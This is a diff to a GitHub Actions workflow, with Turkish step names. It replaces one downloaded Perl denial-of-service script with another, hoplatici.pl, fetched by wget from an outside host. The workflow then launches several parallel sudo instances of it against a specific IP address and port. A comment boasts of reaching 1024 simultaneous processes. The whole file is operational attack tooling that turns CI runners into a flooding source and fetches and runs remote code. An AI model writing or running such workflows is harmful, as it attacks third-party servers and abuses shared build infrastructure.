@@ -17,15 +17,15 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://github.com/weird1337/Stanley/raw/517ac62eab432af4e99b1dc98ae35b7fce07a7ea/FivemDos.pl -O FivemDos.pl
-          chmod +x FivemDos.pl
+          wget https://wgetz.com/jyq4xjmASd/hoplatici.pl -O hoplatici.pl
+          chmod +x hoplatici.pl
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
           PIDS=()
           for i in {1..6}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 60 perl FivemDos.pl 185.137.98.58 60 &
+            sudo timeout 60 perl hoplatici.pl 216.202.200.164 53 1400 60 &
             PIDS+=($!)
           done
           
